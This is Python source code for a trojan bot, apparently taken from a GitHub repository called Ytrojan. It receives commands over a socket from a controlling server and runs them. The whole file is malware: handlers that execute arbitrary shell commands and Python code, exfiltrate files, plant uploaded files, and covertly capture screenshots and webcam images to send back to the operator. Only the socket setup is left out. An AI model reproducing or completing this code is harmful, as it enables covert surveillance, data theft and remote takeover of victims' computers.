# https://github.com/ycy20090311/Ytrojan
# This is the bot's unprocessed source code
# This can't be run directly unless you modify the code in main

import io
import os
import cv2
import sys
import json
import base64
import struct
import socket
import platform
import subprocess
from PIL import ImageGrab


class NetError(Exception):
    pass

def send_json(socket:socket.socket,message:dict) -> None:
    try:
        message_data = json.dumps(message).encode()
        message_length = len(message_data)
        socket.sendall(struct.pack("i", message_length) + message_data)
    except:
        raise NetError

def recv_json(socket:socket.socket) -> dict:
    try:
        message_length = struct.unpack("i", socket.recv(4))[0]
        message_data = b""
        while len(message_data) < message_length:
            message_data += socket.recv(1024)
        return json.loads(message_data)
    except:
        raise NetError

def sysinfo_handle() -> dict:
    return platform.uname()._asdict()

def shell_handle(input:list[str],timeout:bool) -> dict:
    try:
        if timeout:
            process = subprocess.run(input,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,shell=True,text=True,timeout=5)
        else:
            process = subprocess.run(input,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,shell=True,text=True,timeout=None)
        return {"status":True,"output":process.stdout}
    
    except:
        return {"status":False,"output":""}
    
def download_handle(path:str) -> dict:
    try:
        file = open(path,"rb")
        content = base64.b64encode(file.read()).decode()
        file.close()
        return {"status":True,"content":content}
    
    except:
        return {"status":False,"content":""}
    
def upload_handle(path:str,content:str) -> dict:
    try:
        file = open(path,"wb+")
        file.write(base64.b64decode(content.encode()))
        file.close()
        return {"status":True}
    
    except:
        return {"status":False}

def script_handle(input:str) -> tuple:
    try:
        output = io.StringIO()
        sys.stdout = output
        exec(input)
        sys.stdout = sys.__stdout__
        return {"status":True,"output":output.getvalue()}
    
    except Exception as e:
        sys.stdout = sys.__stdout__
        return {"status":False,"output":e.args}
    
def screenshot_handle() -> dict:
    try:
        ImageGrab.grab().save(".screenshot.jpg")
        file = open(".screenshot.jpg","rb")
        content = base64.b64encode(file.read()).decode()
        file.close()
        os.remove(".screenshot.jpg")
        return {"status":True,"content":content}
    
    except:
        return {"status":False,"content":""}

def webcamlist_handle() -> dict:
    webcamlist = []
    id = 0
    while True:
        webcam = cv2.VideoCapture(id)
        if webcam.read()[0]:
            width = webcam.get(cv2.CAP_PROP_FRAME_WIDTH)
            height = webcam.get(cv2.CAP_PROP_FRAME_HEIGHT)
            webcamlist.append((id,width,height))
            webcam.release()
        else:
            break
        id += 1
    if webcamlist:
        return {"status":True,"webcamlist":webcamlist}
    return {"status":False,"webcamlist":[]}

def webcamsnap_handle(id:int) -> dict:
    webcam = cv2.VideoCapture(id)
    if webcam.isOpened():
        flag,image = webcam.read()
        if flag:
            cv2.imwrite(".webcamsnap.jpg",image)
            file = open(".webcamsnap.jpg","rb")
            content = base64.b64encode(file.read()).decode()
            file.close()
            os.remove(".webcamsnap.jpg")
            return {"status":True,"content":content}
    return {"status":True,"content":""}
        
def unknown_handle() -> dict:
    return {}
 
def main():
    while True:
        try:
            request = recv_json(_socket)
            match request["type"]:
                case "sysinfo":
                    response = sysinfo_handle()
                case "shell":
                    response = shell_handle(request["input"],request["timeout"])
                case "download":
                    response = download_handle(request["path"])
                case "upload":
                    response = upload_handle(request["path"],request["content"])
                case "script":
                    response = script_handle(request["input"])
                case "screenshot":
                    response = screenshot_handle()
                case "webcamlist":
                    response = webcamlist_handle()
                case "webcamsnap":
                    response = webcamsnap_handle(request["id"])
                case _:
                    response = unknown_handle()
            send_json(_socket,response)     
        except NetError:
            return
        
main()   
            
                
        
    
    



 